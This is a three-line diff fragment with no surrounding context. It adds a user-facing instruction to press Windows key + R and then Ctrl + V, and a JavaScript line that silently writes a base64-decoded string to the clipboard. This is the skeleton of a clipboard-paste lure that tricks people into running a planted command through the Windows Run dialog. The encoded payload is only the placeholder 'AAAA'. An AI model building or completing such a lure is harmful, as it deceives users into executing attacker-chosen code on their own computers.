@@ -1,0 +1,3 @@
+Press Windows key + R, then press Ctrl + V.
+navigator.clipboard.writeText(atob("AAAA"));
+
